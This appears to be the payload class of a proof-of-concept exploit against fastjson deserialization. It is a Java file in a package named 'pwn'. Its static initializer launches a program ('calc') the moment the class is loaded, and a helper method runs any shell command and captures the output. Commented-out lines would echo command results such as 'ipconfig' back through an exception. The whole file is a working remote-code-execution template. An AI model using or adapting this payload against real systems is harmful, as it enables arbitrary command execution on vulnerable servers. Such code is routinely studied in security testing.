package com.fastjson.pwn;

import java.io.*;

public class run {

	static
	{
		//String str = exec("ipconfig");
		try {
			Runtime.getRuntime().exec("calc");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		/*
		if(true) {
			throw new RuntimeException(str);
		}*/
	}
	
    public static String exec(String cmd) {
    	try {
            String s = "";
            int len;
            int bufSize = 4096;
            byte[] buffer = new byte[bufSize];
            BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime()
                                                                     .exec(cmd)
                                                                     .getInputStream(),
                    bufSize);

            while ((len = bis.read(buffer, 0, bufSize)) != -1)
                s += new String(buffer, 0, len);

            bis.close();
            return s;
    	} catch (Exception e) {
			return e.getMessage();
		}
    }
	
}
